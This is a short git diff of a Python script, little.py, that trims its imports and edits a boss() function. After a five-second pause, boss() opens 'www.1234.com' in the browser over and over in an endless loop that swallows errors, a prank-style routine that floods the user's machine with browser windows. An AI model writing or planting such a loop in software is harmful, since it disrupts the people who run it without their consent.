@@ -2,20 +2,14 @@
 Author: TERRY
 Date: 2022-05-03 21:31:19
 LastEditors: TERRY
-LastEditTime: 2022-05-04 21:37:16
-FilePath: \Python系统课\little.py
+LastEditTime: 2022-05-07 11:13:08
+FilePath: \undefinedc:\Users\pxm\Desktop\python---\little.py
 Description: 
 '''
-import tkinter as tk
+
 import os
 import webbrowser as web
-import random
-import threading
-import tkinter.messagebox as tm
-import getpass
 import time
-
-from cv2 import Stitcher_ERR_CAMERA_PARAMS_ADJUST_FAIL
 def step1():
     temp=0
     while temp<300:
@@ -28,7 +22,7 @@ def boss():
     time.sleep(5)
     while True:
         try:
-            web.open('www')
+            web.open('www.1234.com')
         except:
             pass
 def step2():
